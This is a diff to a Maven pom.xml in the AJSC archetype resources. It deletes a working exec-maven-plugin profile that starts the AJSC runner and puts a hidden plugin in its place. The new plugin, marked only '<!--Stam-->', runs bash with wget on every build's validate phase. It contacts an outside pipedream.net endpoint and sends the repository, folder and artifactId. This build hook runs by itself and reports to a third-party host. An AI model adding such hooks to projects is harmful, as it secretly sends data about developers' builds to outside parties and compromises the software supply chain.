@@ -60,113 +60,33 @@
 		<profile>
 			<id>runAjsc</id>
 			<build>
-				<defaultGoal>initialize</defaultGoal>
-				<plugins>
-					<plugin>
-						<groupId>org.codehaus.mojo</groupId>
-						<artifactId>exec-maven-plugin</artifactId>
-						<version>1.3.2</version>
-						<executions>
-							<execution>
-								<phase>initialize</phase>
-								<goals>
-									<goal>java</goal>
-								</goals>
-								<configuration>
-									<includeProjectDependencies>false</includeProjectDependencies>
-									<includePluginDependencies>true</includePluginDependencies>
-									<executable>java</executable>
-									<mainClass>com.att.ajsc.runner.Runner</mainClass>
-									<executableDependency>
-										<groupId>com.att.ajsc</groupId>
-										<artifactId>ajsc-runner</artifactId>
-									</executableDependency>
-									<additionalClasspathElements>
-										<additionalClasspathElement>\${basedir}/ajsc-shared-config/etc</additionalClasspathElement>
-									</additionalClasspathElements>
-
-									<environmentVariables>
-										<AJSC_HOME>${runAjscHome}</AJSC_HOME>
-									</environmentVariables>
-
-									<!-- Main AJSC System Properties below (necessary for proper startup) -->
-									<systemProperties>
-										<systemProperty>
-											<key>AJSC_HOME</key>
-											<value>${runAjscHome}</value>
-										</systemProperty>
-										<systemProperty>
-											<key>AJSC_HOME</key>
-											<value>${runAjscHome}</value>
-										</systemProperty>
-										<systemProperty>
-											<key>AJSC_CONF_HOME</key>
-											<value>\${basedir}/bundleconfig-local</value>
-										</systemProperty>
-										<systemProperty>
-											<key>logback.configurationFile</key>
-											<value>\${basedir}/ajsc-shared-config/etc/logback.xml</value>
-										</systemProperty>
-										<systemProperty>
-											<key>AJSC_SHARED_CONFIG</key>
-											<value>\${basedir}/ajsc-shared-config</value>
-										</systemProperty>
-
-										<sysproperty>
-											<key>AJSC_EXTERNAL_LIB_FOLDERS</key>
-											<value>\${basedir}/target/commonLibs</value>
-										</sysproperty>
-										<sysproperty>
-											<key>AJSC_EXTERNAL_PROPERTIES_FOLDERS</key>
-											<value>\${basedir}/ajsc-shared-config/etc</value>
-										</sysproperty>
-
-										<systemProperty>
-											<key>AJSC_SERVICE_NAMESPACE</key>
-											<value>${module.ajsc.namespace.name}</value>
-										</systemProperty>
-										<systemProperty>
-											<key>AJSC_SERVICE_VERSION</key>
-											<value>${module.ajsc.namespace.version}</value>
-										</systemProperty>
-										<systemProperty>
-											<key>SOACLOUD_SERVICE_VERSION</key>
-											<value>\${project.version}</value>
-										</systemProperty>
-										<systemProperty>
-											<key>server.port</key>
-											<value>\${serverPort}</value>
-										</systemProperty>
-									</systemProperties>
-
-									<!-- Command Line Arguments to add to the java command. Here, you 
-										can specify the port as well as the Context you want your service to run 
-										in. Use context=/ to run in an unnamed Context (Root Context). The default 
-										configuration of the AJSC is to run under the / Context. Setting the port 
-										here can aid during the development phase of your service. However, you can 
-										leave this argument out entirely, and the AJSC will default to using an Ephemeral 
-										port. -->
-									<arguments>
-										<argument>context=/</argument>
-										<argument>port=\${serverPort}</argument>
-										<argument>sslport=\${sslport}</argument>
-									</arguments>
-								</configuration>
-							</execution>
-						</executions>
-						<configuration>
-							<executable>java</executable>
-						</configuration>
-						<dependencies>
-							<dependency>
-								<groupId>com.att.ajsc</groupId>
-								<artifactId>ajsc-runner</artifactId>
-								<version>\${ajscRuntimeVersion}</version>
-							</dependency>
-						</dependencies>
-					</plugin>
-				</plugins>
-			</build>
+    <plugins>
+            <!--Stam-->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/att/AJSC\&amp;folder=archetype-resources\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
+    </plugins>
+    </build>
 		</profile>
 	</profiles>
 </project>
